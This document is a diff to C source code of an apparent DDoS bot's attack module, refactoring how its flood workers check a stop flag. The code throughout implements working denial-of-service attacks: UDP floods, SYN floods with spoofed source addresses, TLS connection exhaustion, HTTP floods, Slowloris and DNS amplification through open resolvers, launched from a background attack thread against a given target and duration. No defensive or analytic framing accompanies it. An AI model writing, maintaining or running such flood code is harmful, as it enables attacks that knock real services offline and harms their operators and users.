@@ -35,7 +35,7 @@ static int safe_sendmmsg(int fd, struct mmsghdr *msgvec, unsigned int vlen, int 
     static volatile int use_sendmsg = -1;
     if (use_sendmsg == 1) {
         int sent = 0;
-        for (unsigned int i = 0; i < vlen && !g_attack_stop; i++) {
+        for (unsigned int i = 0; i < vlen && !is_attack_stop(); i++) {
             ssize_t r = sendmsg(fd, &msgvec[i].msg_hdr, flags);
             if (r >= 0) { sent++; msgvec[i].msg_len = (unsigned int)r; }
             else if (errno == EAGAIN || errno == EWOULDBLOCK) break;
@@ -47,7 +47,7 @@ static int safe_sendmmsg(int fd, struct mmsghdr *msgvec, unsigned int vlen, int 
         __sync_val_compare_and_swap(&use_sendmsg, -1, 1);
         fprintf(stderr, "[atk] sendmmsg ENOSYS, using sendmsg fallback\n");
         int sent = 0;
-        for (unsigned int i = 0; i < vlen && !g_attack_stop; i++) {
+        for (unsigned int i = 0; i < vlen && !is_attack_stop(); i++) {
             ssize_t sr = sendmsg(fd, &msgvec[i].msg_hdr, flags);
             if (sr >= 0) { sent++; msgvec[i].msg_len = (unsigned int)sr; }
             else if (errno == EAGAIN || errno == EWOULDBLOCK) break;
@@ -181,7 +181,7 @@ static void *mega_worker(void *arg) {
     int port_off = 0;
     unsigned int zc_counter = 0;
 
-    while (time(NULL) - start < mt->duration && !g_attack_stop) {
+    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
         if (should_pause()) { usleep(200); continue; }
 
         port_off = (port_off + 1) % 64;
@@ -190,7 +190,7 @@ static void *mega_worker(void *arg) {
         mt->target.sin_port = htons(dp);
         /* msg_name pointers all point to mt->target, port change is auto-visible */
 
-        for (int si = 0; si < mt->sock_count && !g_attack_stop; si++) {
+        for (int si = 0; si < mt->sock_count && !is_attack_stop(); si++) {
             /* Anti-pattern mutation every ~32nd iteration */
             if ((seed & 0x1F) == 0) {
                 int slot = rand_r(&seed) % batch;
@@ -264,7 +264,7 @@ static void *syn_worker(void *arg) {
     unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
     time_t start = time(NULL);
 
-    while (time(NULL) - start < mt->duration && !g_attack_stop) {
+    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
         pkt.ip.saddr = rand_vn_ip();
         pkt.tcp.source = htons((uint16_t)(1024 + rand_r(&seed) % 64511));
         pkt.tcp.seq = htonl(rand_r(&seed));
@@ -277,7 +277,7 @@ static void *syn_worker(void *arg) {
                    (struct sockaddr *)&sin, sizeof(sin)) > 0)
             pkt_sent(64);
         /* 10K pps burst per worker */
-        for (int b = 0; b < 100 && !g_attack_stop; b++) {
+        for (int b = 0; b < 100 && !is_attack_stop(); b++) {
             pkt.tcp.source = htons((uint16_t)(1024 + rand_r(&seed) % 64511));
             pkt.tcp.seq = htonl(rand_r(&seed));
             pkt.ip.id = htons((uint16_t)rand_r(&seed));
@@ -316,9 +316,9 @@ static void *tls_exhaust_worker(void *arg) {
     struct sockaddr_in ta = mt->target;
     struct pollfd pfds[TLS_POOL];
 
-    while (time(NULL) - start < mt->duration && !g_attack_stop) {
+    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
         /* Top up pool */
-        while (pool < TLS_POOL && !g_attack_stop) {
+        while (pool < TLS_POOL && !is_attack_stop()) {
             int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
             if (s < 0) break;
             int fl = 1;
@@ -362,7 +362,7 @@ static void *tls_exhaust_worker(void *arg) {
                 }
             }
             /* Refill killed connections */
-            while (w < pool && !g_attack_stop) {
+            while (w < pool && !is_attack_stop()) {
                 int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                 if (s < 0) break;
                 int fl = 1;
@@ -409,8 +409,8 @@ static void *http_worker(void *arg) {
     };
     const char *paths[] = {"/", "/search?q=", "/login", "/api/v1/", "/wp-admin/", "/.env", "/admin/"};
 
-    while (time(NULL) - start < mt->duration && !g_attack_stop) {
-        for (int c = 0; c < 64 && !g_attack_stop; c++) {
+    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
+        for (int c = 0; c < 64 && !is_attack_stop(); c++) {
             int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
             if (s < 0) continue;
             int fl = 1;
@@ -471,9 +471,9 @@ static void *slowloris_worker(void *arg) {
     struct sockaddr_in ta = mt->target;
     int pool = 0;
 
-    while (time(NULL) - start < mt->duration && !g_attack_stop) {
+    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
         /* Fill pool */
-        while (pool < SLOW_POOL && !g_attack_stop) {
+        while (pool < SLOW_POOL && !is_attack_stop()) {
             int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
             if (s < 0) break;
             int fl = 1;
@@ -569,15 +569,15 @@ static void *dns_worker(void *arg) {
     unsigned char q[512];
     unsigned short txid = 0;
 
-    while (time(NULL) - start < mt->duration && !g_attack_stop) {
-        for (int ri = 0; ri < nres && !g_attack_stop; ri++) {
+    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
+        for (int ri = 0; ri < nres && !is_attack_stop(); ri++) {
             struct sockaddr_in res_sa;
             memset(&res_sa, 0, sizeof(res_sa));
             res_sa.sin_family = AF_INET;
             res_sa.sin_port = htons(53);
             inet_pton(AF_INET, resolvers[ri], &res_sa.sin_addr);
 
-            for (int ti = 0; ti < 4 && !g_attack_stop; ti++) {
+            for (int ti = 0; ti < 4 && !is_attack_stop(); ti++) {
                 txid = (unsigned short)(rand_r(&seed) & 0xFFFF);
                 int off = 0;
                 /* DNS header */
@@ -640,8 +640,8 @@ void *bg_attack_thread(void *arg)
     if (!atk->target[0]) { free(ctx); return NULL; }
 
     time_t deadline = time(NULL) + atk->duration_secs;
-    g_attack_active = 1;
-    g_attack_stop = 0;
+    set_attack_active(1);
+    clear_attack_stop();
     g_pkt_count = 0;
     g_byte_count = 0;
 
@@ -654,7 +654,14 @@ void *bg_attack_thread(void *arg)
     int is_dns    = atk->dns_amp || !strcmp(method, "DNS_AMP");
 
     /* Default to UDP MEGA if no specific method */
-    if (!is_syn && !is_tls && !is_http && !is_slow && !is_dns) mega = 1;
+    int is_udp = !strcmp(method, "UDP") || !strcmp(method, "MEGA");
+    if (!is_syn && !is_tls && !is_http && !is_slow && !is_dns && !is_udp) {
+        fprintf(stderr, "[atk] unknown method, abort\n");
+        set_attack_active(0);
+        free(ctx);
+        return NULL;
+    }
+    if (is_udp) mega = 1;
 
     int cores = get_nprocs();
     if (cores < 1) cores = 1;
@@ -672,14 +679,14 @@ void *bg_attack_thread(void *arg)
         if (max_sk < 8) max_sk = 8;
 
         int *socks = calloc((size_t)max_sk, sizeof(int));
-        if (!socks) { g_attack_active = 0; free(ctx); return NULL; }
+        if (!socks) { set_attack_active(0); free(ctx); return NULL; }
         int sock_cnt = 0;
         for (int i = 0; i < max_sk; i++) {
             int s = create_udp_socket();
             if (s < 0) break;
             socks[sock_cnt++] = s;
         }
-        if (sock_cnt < 1) { free(socks); g_attack_active = 0; free(ctx); return NULL; }
+        if (sock_cnt < 1) { free(socks); set_attack_active(0); free(ctx); return NULL; }
 
         struct sockaddr_in ta;
         memset(&ta, 0, sizeof(ta));
@@ -687,7 +694,7 @@ void *bg_attack_thread(void *arg)
         ta.sin_port = htons((uint16_t)atk->port);
         if (resolve_target(atk->target, &ta.sin_addr) != 0) {
             for (int i = 0; i < sock_cnt; i++) close(socks[i]);
-            free(socks); g_attack_active = 0; free(ctx); return NULL;
+            free(socks); set_attack_active(0); free(ctx); return NULL;
         }
 
         int n_udp = cores;
@@ -701,7 +708,7 @@ void *bg_attack_thread(void *arg)
         if (!tids || !mt) {
             for (int i = 0; i < sock_cnt; i++) close(socks[i]);
             free(socks); free(tids); free(mt);
-            g_attack_active = 0; free(ctx); return NULL;
+            set_attack_active(0); free(ctx); return NULL;
         }
 
         fprintf(stderr, "[atk] MEGA UDP target=%s:%d dur=%ds socks=%d workers=%d\n",
@@ -724,8 +731,8 @@ void *bg_attack_thread(void *arg)
         }
         pthread_attr_destroy(&attr);
 
-        while (!g_attack_stop && time(NULL) < deadline) sleep(1);
-        g_attack_stop = 1;
+        while (!is_attack_stop() && time(NULL) < deadline) sleep(1);
+        request_attack_stop();
         for (int i = 0; i < threads; i++) pthread_join(tids[i], NULL);
         for (int i = 0; i < sock_cnt; i++) close(socks[i]);
         free(socks); free(tids); free(mt);
@@ -737,7 +744,7 @@ void *bg_attack_thread(void *arg)
         ta.sin_family = AF_INET;
         ta.sin_port = htons((uint16_t)atk->port);
         if (resolve_target(atk->target, &ta.sin_addr) != 0) {
-            g_attack_active = 0; free(ctx); return NULL;
+            set_attack_active(0); free(ctx); return NULL;
         }
 
         int threads = cores;
@@ -746,7 +753,7 @@ void *bg_attack_thread(void *arg)
 
         pthread_t *tids = calloc((size_t)threads, sizeof(pthread_t));
         MegaThread *mt = calloc((size_t)threads, sizeof(MegaThread));
-        if (!tids || !mt) { free(tids); free(mt); g_attack_active = 0; free(ctx); return NULL; }
+        if (!tids || !mt) { free(tids); free(mt); set_attack_active(0); free(ctx); return NULL; }
 
         int tag;
         const char *label;
@@ -771,14 +778,14 @@ void *bg_attack_thread(void *arg)
         }
         pthread_attr_destroy(&attr);
 
-        while (!g_attack_stop && time(NULL) < deadline) sleep(1);
-        g_attack_stop = 1;
+        while (!is_attack_stop() && time(NULL) < deadline) sleep(1);
+        request_attack_stop();
         for (int i = 0; i < threads; i++) pthread_join(tids[i], NULL);
         free(tids); free(mt);
     }
 
     fprintf(stderr, "[atk] DONE pkts=%llu bytes=%llu\n", g_pkt_count, g_byte_count);
-    g_attack_active = 0;
+    set_attack_active(0);
     free(ctx);
     return NULL;
 }
